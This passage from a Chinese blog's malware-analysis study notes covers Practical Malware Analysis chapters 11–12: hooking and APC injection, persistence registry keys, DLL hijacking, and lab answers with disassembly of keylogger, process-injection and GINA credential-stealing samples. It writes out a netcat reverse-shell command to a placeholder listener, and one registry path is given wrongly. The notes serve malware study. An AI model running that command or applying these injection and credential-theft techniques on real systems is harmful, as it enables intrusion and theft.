Hook的主要函数，参数如下：</p><ul><li>idhook：指定要安装的Hook例程的类型。</li><li>lpfn：Hook例程指针。</li><li>hMod：对于上层的钩子，它用来标识包含lpfn定义的Hook例程的DLL句柄，对于底层Hook，他来标识包含lpfn历程的本地模块句柄。</li><li>dwThreadId：指定与钩子例程关联的线程标识，如果这个参数为0则挂钩例程将绑定与调用线程同在一个桌面的所有线程。</li></ul><p><strong>Detours：</strong>Detours时微软开打的用于拓展已有操作系统和应用程序的减淡工具，但是恶意代码编写人员使用Detours库执行对导入表，挂在DLL到已有程序文件，并向运行的进程添加钩子函数等。恶意代码修改PE结构，并创建一个名为<code>.detour</code>的段，它通常位于导出表与调试符号之间。<code>.detour</code>段在新的导入地址中包含了原始的PE头部。使用Detours库提供的<code>setdll</code>工具，恶意代码编写者修改PE头部，并使其指向新的导出表。</p><p><strong>APC注入：</strong>APC为Windows异步过程调用。通过创建线程来使用远程进程中函数的方法会增加系统开销，所以调用一个现有的线程会更加高效。APC可以让一个线程在它正常执行路径运行之前执行一些其他的代码，每一个线程都有一个附加的APC队列，他们在线程处于可警告的等待状态时被处理。例如<code>WaitForStriongObjectEx</code>、<code>WaitForMultipleObjectsEx</code>和<code>SleepEx</code>函数等，这些函数给了线程一个处理等待APC的机会。如果应用程序在线程可警告等待状态时（未运行之前）排入一个APC队列，name线程将从调用APC函数开始，线程诸葛调用APC队列中的所有APC，当PC队列完成时，线程才继续沿着它规定的路径执行，恶意代码编写者为了让他们的代码立即执行，他们用APC抢占可警告等待状态的线程。</p><p><strong>用户模式的APC注入：</strong>用户模式下，一个线程可以使用API函数<code>QueueUserAPC</code>排入一个让远程调用的函数，运行用户模式的APC要求线程必须处于可警告等待状态，因此恶意代码会查看进程中是否有可能进入这个状态的目标线程，<code>WaitForSingleObjectEx</code>是常用的调用。</p><p><strong>内核模式的APC注入：</strong>使用设备驱动进行APC注入需要使用函数<code>KeInitializeApc</code>和<code>KeInsertQueueApc</code>。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab12-1"><a href="#Lab12-1" class="headerlink" title="Lab12-1"></a>Lab12-1</h3><p><strong>分析恶意代码确保这些文件在同一目录下</strong></p><p><strong>问题</strong></p><p><strong>1.在你运恶意代码的可执行文件时会发生什么？</strong></p><p>程序会每隔一分钟弹出一个<code>MessageBox</code>显示<code>Press OK to reboot</code>。</p><p><strong>2.哪个进程会被注入？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401095                 push    0Ch             ; size_t<br>.text:00401097                 push    offset explore_exe ; &quot;explorer.exe&quot;<br>.text:0040109C                 lea     ecx, [ebp+var_108]<br>.text:004010A2                 push    ecx             ; char *<br>.text:004010A3                 call    __strnicmp<br></code></pre></td></tr></table></figure><p>代码会循环对比进程是否为<code>explorer.exe</code>，如果对比成功则进行注入。</p><p><strong>3.你如何能够让恶意代码停止弹出窗口？</strong></p><p>重新启动进程<code>explorer.exe</code>。</p><p><strong>4.这些恶意代码样本是如何工作的？</strong></p><p>略。</p><h3 id="Lab12-2"><a href="#Lab12-2" class="headerlink" title="Lab12-2"></a><strong>Lab12-2</strong></h3><p><strong>问题</strong></p><p><strong>1.这个程序的目的是什么？</strong></p><p>隐蔽地启动另一个程序。</p><p><strong>2.启动器代码是如何隐蔽执行的？</strong></p><p>进程替换。</p><p><strong>3.恶意代码的负载存储在哪里？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    offset Type     ; &quot;UNICODE&quot;<br>push    offset Name     ; &quot;LOCALIZATION&quot;<br>mov     eax, [ebp+hModule]<br>push    eax             ; hModule<br>call    ds:FindResourceA<br></code></pre></td></tr></table></figure><p>程序将恶意负载存储在资源节<code>LOCALIZATION</code>中。</p><p><img src="https://i.loli.net/2019/03/26/5c999194b3465.png"></p><p><strong>4.恶意负载是如何被保护的？</strong></p><p>通过XOR编码加密。</p><p><strong>5.字符串列表是如何被保护的？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401016                 mov     ecx, [ebp+var_4]<br>.text:00401019                 cmp     ecx, [ebp+arg_4]<br>.text:0040101C                 jnb     short loc_401033<br>.text:0040101E                 mov     edx, [ebp+arg_0]<br>.text:00401021                 add     edx, [ebp+var_4]<br>.text:00401024                 mov     al, [edx]<br>.text:00401026                 xor     al, [ebp+arg_8]<br>.text:00401029                 mov     ecx, [ebp+arg_0]<br>.text:0040102C                 add     ecx, [ebp+var_4]<br>.text:0040102F                 mov     [ecx], al<br></code></pre></td></tr></table></figure><p>通过XOR加密。</p><h3 id="Lab12-3"><a href="#Lab12-3" class="headerlink" title="Lab12-3"></a>Lab12-3</h3><p><strong>问题</strong></p><p><strong>1.这个恶意负载的目的是什么？</strong></p><p>其实看到这些跟键盘相关的字符串就能差不多猜出这是一个键盘监听器：</p><p><img src="https://i.loli.net/2019/03/26/5c9a1eefc03f9.png"></p><p>通过分析函数<code>sub_4010C7</code>也可以看出这是一个键盘窃听器。</p><p><strong>2.恶意负载时如何注入自身的？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  HMODULE v3; <span class="hljs-comment">// eax</span><br>  HWND hWnd; <span class="hljs-comment">// [esp+0h] [ebp-8h]</span><br>  HHOOK hhk; <span class="hljs-comment">// [esp+4h] [ebp-4h]</span><br><br>  AllocConsole();<br>  hWnd = FindWindowA(ClassName, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( hWnd )<br>    ShowWindow(hWnd, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(byte_405350, <span class="hljs-number">1</span>, <span class="hljs-number">0x400</span>u);<br>  v3 = GetModuleHandleA(<span class="hljs-number">0</span>);<br>  hhk = SetWindowsHookExA(<span class="hljs-number">13</span>, fn, v3, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( GetMessageA(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) )<br>    ;<br>  <span class="hljs-keyword">return</span> UnhookWindowsHookEx(hhk);<br>&#125;<br></code></pre></td></tr></table></figure><p>此程序通过设置挂钩注入来实现键盘监听。</p><p><strong>3.这个程序还创建了哪些其他文件？</strong></p><p><code>practicalmalwareanalysis.log</code></p><h3 id="Lab12-4"><a href="#Lab12-4" class="headerlink" title="Lab12-4"></a>Lab12-4</h3><p><strong>问题</strong></p><p><strong>1.位置0x401000的代码完成了什么功能？</strong></p><p>这个代码跟上面分析的函数流程相似，在系统内搜索所有进程，验证进程名称是否为<code>winlogon.exe</code>。</p><p><strong>2.代码注入了哪个进程？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401174</span><span class="hljs-params">(DWORD dwProcessId)</span><br>&#123;<br>  HMODULE v2; <span class="hljs-comment">// eax</span><br>  HANDLE hProcess; <span class="hljs-comment">// [esp+4h] [ebp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( sub_4010FC(aSedebugprivile) )            <span class="hljs-comment">// SeDebugPrivilege</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v2 = LoadLibraryA(LibFileName);               <span class="hljs-comment">// sfc_os.dll</span><br>  lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(v2, (LPCSTR)<span class="hljs-number">2</span>);<br>  hProcess = OpenProcess(<span class="hljs-number">0x1F0FFF</span>u, <span class="hljs-number">0</span>, dwProcessId);<br>  <span class="hljs-keyword">if</span> ( !hProcess )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  CreateRemoteThread(hProcess, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, lpStartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>参数<code>dwProcessId</code>是<code>winlogon.exe</code>的<code>ProcessId</code>。</p><p><code>winlogon.exe</code></p><p><strong>3.使用LoadLibraryA装载了哪个DLL程序？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004011A3                 push    offset LibFileName ; &quot;sfc_os.dll&quot;<br>.text:004011A8                 call    ds:LoadLibraryA<br>.text:004011AE                 push    eax             ; hModule<br>.text:004011AF                 call    ds:GetProcAddress<br>.text:004011B5                 mov     lpStartAddress, eax<br>.text:004011BA                 mov     eax, [ebp+dwProcessId]<br>.text:004011BD                 push    eax             ; dwProcessId<br>.text:004011BE                 push    0               ; bInheritHandle<br>.text:004011C0                 push    1F0FFFh         ; dwDesiredAccess<br>.text:004011C5                 call    ds:OpenProcess<br></code></pre></td></tr></table></figure><p><code>sfc_os.dll</code>。</p><p><strong>4.传递个CreateRemoteThread调用的第四个参数是什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004011D8                 push    0               ; lpThreadId<br>.text:004011DA                 push    0               ; dwCreationFlags<br>.text:004011DC                 push    0               ; lpParameter<br>.text:004011DE                 mov     ecx, lpStartAddress<br>.text:004011E4                 push    ecx             ; lpStartAddress<br>.text:004011E5                 push    0               ; dwStackSize<br>.text:004011E7                 push    0               ; lpThreadAttributes<br>.text:004011E9                 mov     edx, [ebp+hProcess]<br>.text:004011EC                 push    edx             ; hProcess<br>.text:004011ED                 call    ds:CreateRemoteThread<br></code></pre></td></tr></table></figure><p><code>sfc_os.dll</code>的地址。</p><p><strong>5.二进制主程序释放出了哪个恶意代码？</strong></p><p>在函数<code>sub_4011FC()</code>中可以看到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004012A7                 mov     [ebp+hModule], eax<br>.text:004012AA                 push    offset Type     ; &quot;BIN&quot;<br>.text:004012AF                 push    offset Name     ; &quot;#101&quot;<br>.text:004012B4                 mov     eax, [ebp+hModule]<br>.text:004012B7                 push    eax             ; hModule<br>.text:004012B8                 call    ds:FindResourceA<br></code></pre></td></tr></table></figure><p>于是在<code>ResourceHacker</code>中看一下资源节发现确实有一个PE文件：</p><p><img src="https://i.loli.net/2019/03/26/5c9a3c5f65a0a.png"></p><p>释放的文件名为<code>\system32\wupdmgr.exe</code>。</p><p><strong>6.释放出恶意代码的目的是什么？</strong></p><p>恶意代码使用这个程序进行自我更新。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>恶意代码启动方式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码行为</title>
    <link href="/2019/03/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <url>/2019/03/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。</p><p><strong>下载器和启动器：</strong>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用<code>WindowsAPI</code>函数<code>URLDownloadtoFileA</code>和<code>WinExec</code>，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。</p><p><strong>后门：</strong>后门可以让攻击者远程访问一个受害的机器。通常使用80端口的HTTP协议与控制机器进行通信。</p><span id="more"></span><p><strong>反向Shell：</strong>反向Shell是从受害者主机发起的向攻击者连接，为攻击者提供被感染机器的访问权限，一般有如下反向弹Shell的方式：</p><ul><li>NetCat：网络瑞士军刀，可以通过命令<code>nc listener_ip 80 -e cmd.exe</code>来弹Shell。</li><li>Windows反向Shell：使用<code>cmd.exe</code>作为反向Shell，首先创建一个套接字并于远程服务器简历连接。然后绑定这个套接字与<code>cmd.exe</code>的标准流再调用<code>CreateProcess</code>函数用隐藏窗口的方式创建cmd.exe。也可以使用多线程方式：使用<code>CreatPipe</code>来绑定一个通道的读写端，如标准输入标准输出，<code>CreateProcess</code>函数用来绑定一个管道与标准流，而不是直接与套接字绑定。调用<code>CreateProcess</code>方法，恶意代码会产生两个线程，一个用来从标准输入管道读取数据，并向套接字写数据，另外一个用来从一个套接字读数据，并向一个标准管道中写数据。通常这两个线程使用数据编码来混淆数据。</li></ul><p><strong>远程控制工具：</strong>远程控制工具RAT能被用来管理一台或者多台计算机。远程控制工具进场为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p><p><strong>僵尸网络：</strong>僵尸网络是被感染主机的一个集合。他们由单一实体控制，其目标同行是为了进行DDoS攻击。</p><p><strong>登陆凭证窃密器：</strong>攻击者通常使用以下三种方法进行登陆凭证的窃取：</p><ul><li>等待用户登陆以窃取登陆凭证</li><li>击键记录器</li><li>转储Windows系统中存放的信息，如密码hash值，程序直接使用它或者对它进行离线爆破。</li></ul><p><strong>特殊注册表：</strong>恶意代码编写者可以通过一个名为<code>AppInit_DLL</code>特殊注册表项来让他们的DLL得到加载，此注册表项中的DLL程序回在进程加载<code>User32.dll</code>时被加载，<code>AppInit_DLL</code>位置如下：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost<br></code></pre></td></tr></table></figure><p>恶意代码编写者可以挂钩一个特殊的<code>Winlogon Notify</code>事件，如登陆、注销、关机、锁屏等，这些甚至允许恶意代码再安全模式下加载，以下注册表键中的注册表项包含Notify值：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\<br></code></pre></td></tr></table></figure><p><code>Windows</code>所有的服务都存在与注册表中，恶意代码经常作为一个服务安装，安装的恶意代码作为<code>svchost.exe</code>的DLL来存活，这使得恶意代码可以与其他进程混淆，更像一个标准的服务。<code>svchost.exe</code>时从动态链接库中运行服务的通用主机进程，<code>Windows</code>操作系统通常用以时刻运行多个<code>svchost.exe</code>实例，每个实例包含一组服务，这些组定义子啊下列的注册表位置：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost<br></code></pre></td></tr></table></figure><p>服务被定义在如下位置：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName<br></code></pre></td></tr></table></figure><p><strong>特洛伊木马化（Trojanized）系统二进制文件：</strong>此技术可以直接修改系统的二进制文件，当被感染的二进制文件运行或加载时，将会强制运行恶意代码，恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码，这些修改补丁覆盖函数的开始代码或者覆盖其他的一些并不影响特洛伊木马化DLL正常操作的代码，为了不影响二进制文件的正常操作，恶意代码经常被加到一个可执行文件的空节中，插入的代码并不关心他被插入到感染的DLL的位置。加载恶意代码后，为了让DLL的操作与插入前的一致，代码会跳转回原始的DLL程序。</p><p><strong>DLL加载顺序劫持：</strong>这是一种简单而隐蔽的指数，它允许恶意代码编写者再不适用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序，这种技术甚至不需要单独的恶意加载器。以下是再Windows XP中加载DLL的默认搜索顺序：</p><ul><li>加载应用程序的目录</li><li>当前目录</li><li>系统目录（使用<code>GetSystemDirectory</code>函数获取的路径）</li><li>16位子系统的系统目录</li><li>Windows目录</li><li>PATH环境变量中列出的目录</li></ul><p>在<code>WindowsXP</code>中利用<code>KnownDLL</code>注册表键可以跳过DLL的加载过程，这注册表键保护一些特定的DLL位置列表。DLL加载顺序劫持可以被<code>System32</code>之外的目录中的二进制文件利用，来加载未被<code>KnownDLL</code>保护的DLL程序。由于DLL递归导入的原因，很多DLL会在加载其他的DLL，而这些DLL按照默顺序加载，因此<code>KnownDLL</code>机制也不能得到充分的保护。</p><p><strong>提权：</strong>多数提权攻击时利用本地系统已知漏洞或者0Day漏洞进行攻击。DLL加载顺序劫持也可以被用来进行提权操作，加入恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么DLL就获得了提权。</p><p><strong>使用SeDebugPrivilege进行提权：</strong>在Windows系统中，访问令牌是一个包含进程安全描述符的对象，安全描述符用来指定拥有者的访问权限，SeDebugPrivilege特权作为一个系统级别调试的工具被创建，默认情况下，SeDebugPrivilege只赋给本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限。</p><p><strong>IAT Hook：</strong>这是一种在用户空间中很常见的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接，这种Hook方法修改导入地址表（IAT）或者导出地址表（EAT）从而改变程序的执行流程，但是这种方法很容易被检测出来。</p><p><strong>Inline Hook：</strong>这种方法使用过覆盖导入DLL中的API函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook知识简单的修改函数指针，但是Inline Hook将修改实际的函数代码。恶意Rootkit通常使用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行，另外Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab11-1"><a href="#Lab11-1" class="headerlink" title="Lab11-1"></a>Lab11-1</h3><p><strong>分析恶意代码Lab11-01.exe</strong></p><p><strong>问题</strong></p><p><strong>1.这个恶意代码项磁盘释放了什么？</strong></p><p>通过静态分析，在004010C9位置发现如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004010B8                 mov     eax, lpType<br>.text:004010BD                 push    eax             ; lpType<br>.text:004010BE                 mov     ecx, lpName<br>.text:004010C4                 push    ecx             ; lpName<br>.text:004010C5                 mov     edx, [ebp+hModule]<br>.text:004010C8                 push    edx             ; hModule<br>.text:004010C9                 call    ds:FindResourceA<br>.text:004010CF                 mov     [ebp+hResInfo], eax<br>.text:004010D2                 cmp     [ebp+hResInfo], 0<br>.text:004010D6                 jnz     short loc_4010DF<br>.text:004010D8                 xor     eax, eax<br>.text:004010DA                 jmp     loc_4011BF<br>.text:004010DF ; ---------------------------------------------------------------------------<br>.text:004010DF<br>.text:004010DF loc_4010DF:                             ; CODE XREF: sub_401080+56↑j<br>.text:004010DF                 mov     eax, [ebp+hResInfo]<br>.text:004010E2                 push    eax             ; hResInfo<br>.text:004010E3                 mov     ecx, [ebp+hModule]<br>.text:004010E6                 push    ecx             ; hModule<br>.text:004010E7                 call    ds:LoadResource<br>.text:004010ED                 mov     [ebp+hResData], eax<br>.text:004010F0                 cmp     [ebp+hResData], 0<br>.text:004010F4                 jnz     short loc_4010FB<br>.text:004010F6                 jmp     loc_4011A5<br>.text:004010FB ; ---------------------------------------------------------------------------<br>.text:004010FB<br>.text:004010FB loc_4010FB:                             ; CODE XREF: sub_401080+74↑j<br>.text:004010FB                 mov     edx, [ebp+hResData]<br>.text:004010FE                 push    edx             ; hResData<br>.text:004010FF                 call    ds:LockResource<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/21/5c92e2d4b1d97.png"></p><p>在资源节发现了名为TGAD的节，程序对此节进行了二进制资源的提取。</p><p><img src="https://i.loli.net/2019/03/21/5c92e4d4113dd.png"></p><p>因此程序在磁盘上释放的文件是从资源节中提取出来的数据存储为<code>msgina32.dll</code>。</p><p><strong>2.这个恶意代码如何进行驻留？</strong></p><p>根据如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401004                 push    0               ; lpdwDisposition<br>.text:00401006                 lea     eax, [ebp+phkResult]<br>.text:00401009                 push    eax             ; phkResult<br>.text:0040100A                 push    0               ; lpSecurityAttributes<br>.text:0040100C                 push    0F003Fh         ; samDesired<br>.text:00401011                 push    0               ; dwOptions<br>.text:00401013                 push    0               ; lpClass<br>.text:00401015                 push    0               ; Reserved<br>.text:00401017                 push    offset SubKey   ; &quot;SOFTWARE\\Microsoft\\Windows NT\\Curren&quot;...<br>.text:0040101C                 push    80000002h       ; hKey<br>.text:00401021                 call    ds:RegCreateKeyExA<br>.text:00401027                 test    eax, eax<br>.text:00401029                 jz      short loc_401032<br>.text:0040102B                 mov     eax, 1<br>.text:00401030                 jmp     short loc_40107B<br>.text:00401032                 mov     ecx, [ebp+cbData]<br>.text:00401035                 push    ecx             ; cbData<br>.text:00401036                 mov     edx, [ebp+lpData]<br>.text:00401039                 push    edx             ; lpData<br>.text:0040103A                 push    1               ; dwType<br>.text:0040103C                 push    0               ; Reserved<br>.text:0040103E                 push    offset ValueName ; &quot;GinaDLL&quot;<br>.text:00401043                 mov     eax, [ebp+phkResult]<br>.text:00401046                 push    eax             ; hKey<br>.text:00401047                 call    ds:RegSetValueExA<br>.text:0040104D                 test    eax, eax<br>.text:0040104F                 jz      short loc_401062<br>.text:00401051                 mov     ecx, [ebp+phkResult]<br>.text:00401054                 push    ecx             ; hObject<br>.text:00401055                 call    ds:CloseHandle<br></code></pre></td></tr></table></figure><p>得知恶意代码写入注册表项<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>并设置了值<code>GinaDLL</code>。</p><p><strong>3.这个恶意代码如何窃取用户登陆凭证？</strong></p><p>在msgina32.dll文件的导出函数中发现了大量的以<code>Wlx</code>开头的函数名：</p><p><img src="https://i.loli.net/2019/03/21/5c933c2f74f97.png"></p><p>这些函数都会调用函数<code>sub_10001000()</code>，此函数会直接将调用函数的名称用<code>GetProcAddress</code>函数在<code>msgina.dll</code>文件中查找此函数的地址并将执行流程交给目标函数，目标函数执行完成之后又会返回到恶意程序中，<code>msgina32.dll</code>中的大部分<code>Wlx</code>开头的函数都是这个结构，但是在函数<code>WlxLoggedOutSAS</code>中却不一样，在<code>WlxLoggedOutSAS</code>中调用了函数<code>sub_10001570()</code>向文件<code>msutil32.sys</code>存储了用户凭证的数据。</p><p><strong>4.这个恶意代码对窃取的证书做了什么处理？</strong></p><p>通过查看<code>10001570</code>处代码找到程序将窃取的证书存储在了一个名为<code>msutil32.sys</code>的文件中。</p><p><strong>5.如何在你的测试环境让这个恶意代码获得用户登陆凭证？</strong></p><p>函数<code>WlxLoggedOutSAS</code>的调用发生在用户注销时，因此我们注销重启后就能看到用户登陆凭证。</p><h3 id="Lab11-2"><a href="#Lab11-2" class="headerlink" title="Lab11-2"></a>Lab11-2</h3><p><strong>分析恶意代码Lab11-02.dll。假设一个名为Lab11-02.ini的可疑文件与这个恶意代码一同被发现。</strong></p><p><strong>问题</strong></p><p><strong>1.这个恶意DLL导出了什么？</strong></p><p>这个DLL有两个导出函数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Name</span>AddressOrdinal<br><span class="hljs-attribute">installer</span><span class="hljs-number">1000158</span>B<span class="hljs-number">1</span><br><span class="hljs-attribute">DllEntryPoint</span><span class="hljs-number">100017</span>E9<span class="hljs-meta">[main entry]</span><br></code></pre></td></tr></table></figure><p><strong>2.使用rundll32.exe安装这个恶意代码之后，发生了什么？</strong></p><p>使用命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rundll32<span class="hljs-selector-class">.exe</span> Lab11_02<span class="hljs-selector-class">.dll</span>, installer<br></code></pre></td></tr></table></figure><p>程序会在<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>写入自身，并且将<code>spoolvxx32.dll</code>写入到系统目录中。</p><p><strong>3.为了使这个恶意代码正确安装，Lab11-02.ini必须被放置在何处？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:1000166F                 push    0               ; hTemplateFile<br>.text:10001671                 push    80h             ; dwFlagsAndAttributes<br>.text:10001676                 push    3               ; dwCreationDisposition<br>.text:10001678                 push    0               ; lpSecurityAttributes<br>.text:1000167A                 push    1               ; dwShareMode<br>.text:1000167C                 push    80000000h       ; dwDesiredAccess<br>.text:10001681                 mov     eax, [ebp+Dest]<br>.text:10001684                 push    eax             ; lpFileName<br>.text:10001685                 call    ds:CreateFileA<br></code></pre></td></tr></table></figure><p>此处程序会尝试访问系统目录下的<code>Lab11-02.ini</code>文件，如果此文件存在则继续执行，否则退出，因此我们需要将<code>Lab11-02.ini</code>放在系统目录下。</p><p><strong>4.这个安装的恶意代码如何驻留？</strong></p><p>通过在注册表<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>中添加<code>spoolvxx32.dll</code>。</p><p><strong>5.这个恶意代码采用的用户态Rootkit技术是什么？</strong></p><p>Inline Hook</p><p><strong>6.挂钩代码做了什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 